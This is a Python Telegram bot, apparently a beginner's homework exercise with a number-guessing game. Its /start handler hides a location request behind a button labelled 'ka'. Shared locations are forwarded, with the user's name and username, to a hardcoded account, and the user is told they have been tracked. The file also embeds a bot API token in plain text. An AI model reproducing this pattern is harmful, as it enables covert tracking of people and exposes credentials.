import telebot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup

telbot = telebot.TeleBot("6783947963:AAEEI_uIxs3tOHFBPK-o9Lxc2AhxBR-n9ak")

info = {}
info2 = {}

@telbot.message_handler(commands=["start"])
def soobsh(message):
    print(message)

    print(info)
    knopki = ReplyKeyboardMarkup(resize_keyboard=True)
    knopk = KeyboardButton(text="ka", request_location=True)
    knopki.add(knopk)
    # telbot.send_message(message.from_user.id,"вас выследили",reply_markup=knopki)
    telbot.send_sticker(message.from_user.id, "CAACAgIAAxkBAAEMM81mU1B_M45YswKX4Lt-5PM9uaktQAACAQADwDZPExguczCrPy1RNQQ")
    with open("five-nights-at-freddys-full-scream-sound_2.mp3", "rb") as music:
        telbot.send_voice(message.from_user.id, music)


@telbot.message_handler(content_types=["location"])
def soobsh(message):
    print(message)

    shir, dolg = message.location.latitude, message.location.longitude
    telbot.send_location(5335737972, shir, dolg)
    telbot.send_message(message.from_user.id, "вас выследили")
    telbot.send_message(5335737972, f"подьем\n{message.from_user.first_name}\nusername {message.from_user.username}")


@telbot.message_handler(commands=["play"])
def game(message):
    info[message.from_user.id] = 1
    knopki = ReplyKeyboardMarkup(resize_keyboard=True)

    knopk = KeyboardButton(text="Да", )
    knopk2 = KeyboardButton(text="Нет", )
    knopki.add(knopk, knopk2)
    telbot.send_message(message.from_user.id, "Твое число 1?", reply_markup=knopki)




@telbot.message_handler(commands=["play2"])
def game2(message):
    info2[message.from_user.id] = {"left":1,"right":100}
    print(info2)
    knopki = ReplyKeyboardMarkup(resize_keyboard=True)

    knopk = KeyboardButton(text="Да", )
    knopk2 = KeyboardButton(text="Нет", )
    knopki.add(knopk, knopk2)
    telbot.send_message(message.from_user.id, "Твое число 1?", reply_markup=knopki)


@telbot.message_handler(content_types=["text"])
def soobsh(message):
    print(message)
    if message.from_user.id in info:
        if message.text == "Нет":
            info[message.from_user.id] += 1
            telbot.send_message(message.from_user.id, f"Твое число {info[message.from_user.id]}?", )

        if message.text == "Да":
            telbot.send_message(message.from_user.id, "Ez", )
            del info[message.from_user.id]

    if message.from_user.id not in info:

        if message.text == "Нет":
            telbot.send_message(message.from_user.id, "введите /start")

        if message.text == "Да":
            telbot.send_message(message.from_user.id, "введите /start")


telbot.polling()

"""
Узнать что такое API в программировании, можно видео посмотреть) записать в двух словах что это

- При команде /плей2 выводить три кнопки: "больше", "меньше", "угадал" (надписи можно менять, само собой)
- Сделать проверку, что если юзер нажал на кнопку "больше" (или другая надпись), То просто написать фразу "увеличиваю число"

"""
